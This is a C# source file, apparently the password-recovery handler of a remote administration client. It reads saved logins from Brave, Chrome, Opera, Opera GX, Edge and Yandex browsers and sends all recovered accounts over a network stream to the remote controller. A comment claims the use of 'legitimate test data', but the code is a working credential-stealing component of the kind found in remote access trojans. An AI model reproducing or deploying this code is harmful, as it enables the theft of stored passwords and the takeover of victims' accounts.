using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net.Security;
using System.Threading.Tasks;
using RemoteAdmin.Client.Recovery;
using RemoteAdmin.Client.Recovery.Browsers;
using RemoteAdmin.Shared;

namespace RemoteAdmin.Client.Handlers
{
    public class PasswordRecoveryHandler
    {

        public static async Task HandlePasswordRecoveryRequest(SslStream stream)
        {
            // 1) Gather data (your own, legitimate test data is fine)
            var accounts = new List<RecoveredAccount>();
            var passReaders = new IAccountReader[]
            {
                new BravePassReader(),
                new ChromePassReader(),
                new OperaPassReader(),
                new OperaGXPassReader(),
                new EdgePassReader(),
                new YandexPassReader()
            };
            foreach (var reader in passReaders)
            {
                try
                {
                    var r = reader.ReadAccounts();
                    if (r != null && r.Any())
                        accounts.AddRange(r);
                }
                catch (Exception ex)
                {
                    // don't crash the whole routine on one reader fail
                    Console.WriteLine($"[{reader.GetType().Name}] error: {ex.Message}");
                }
            }

            var response = new PasswordRecoveryResponseMessage
            {
                Success = true,
                Accounts = accounts   // ← use Accounts, not RecoveredAccounts
            };

            await NetworkHelper.SendMessageAsync(stream, response);
        }
    }
}